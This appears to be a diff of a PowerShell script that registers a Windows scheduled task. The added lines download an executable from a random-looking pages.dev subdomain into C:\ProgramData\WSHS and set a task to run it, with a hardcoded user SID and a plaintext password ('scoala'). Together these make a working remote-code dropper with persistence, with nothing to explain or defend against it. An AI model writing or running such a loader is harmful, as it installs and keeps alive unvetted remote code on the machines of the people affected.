@@ -1,13 +1,26 @@
-# Get the current user SID
-$currentSID = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
+# Define the paths
+$folderPath = "C:\ProgramData\WSHS"
+$exePath = "$folderPath\WSHS.exe"
+$downloadURL = "https://ipnqtxhsbvcmurjolgkfadzweyf.pages.dev/files/WSHS.exe"
+$taskName = "WSHSTask"
 
-# Define the XML task content with the current user SID
+# Check if the folder exists, if not, create it
+if (-not (Test-Path -Path $folderPath -PathType Container)) {
+    New-Item -Path $folderPath -ItemType Directory | Out-Null
+}
+
+# Download the file if it doesn't exist
+if (-not (Test-Path -Path $exePath)) {
+    Invoke-WebRequest -Uri $downloadURL -OutFile $exePath
+}
+
+# Update the task XML content with the new executable path
 $xmlContent = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
     <Date>2024-05-24T09:35:08.1353551</Date>
-    <Author>$currentSID</Author>
+    <Author>$env:USERNAME</Author>
     <URI>\start</URI>
   </RegistrationInfo>
   <Triggers>
@@ -17,7 +30,7 @@ $xmlContent = @"
   </Triggers>
   <Principals>
     <Principal id="Author">
-      <UserId>$currentSID</UserId>
+      <UserId>S-1-5-21-1236271145-951668658-3520213435-1001</UserId>
       <LogonType>InteractiveToken</LogonType>
       <RunLevel>LeastPrivilege</RunLevel>
     </Principal>
@@ -45,14 +58,11 @@ $xmlContent = @"
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>C:\Users\User\Desktop\s.exe</Command>
+      <Command>$exePath</Command>
     </Exec>
   </Actions>
 </Task>
 "@
 
-# Register the task using the XML content
-Register-ScheduledTask -Xml $xmlContent -TaskName "MyTask"
-
-# Replace "C:\Users\User\Desktop\s.exe" with the actual path to your executable file.
-#ERROOR
+# Register the task using the updated XML content
+Register-ScheduledTask -Xml $xmlContent -TaskName $taskName -User $env:USERNAME -Password "scoala" -Force
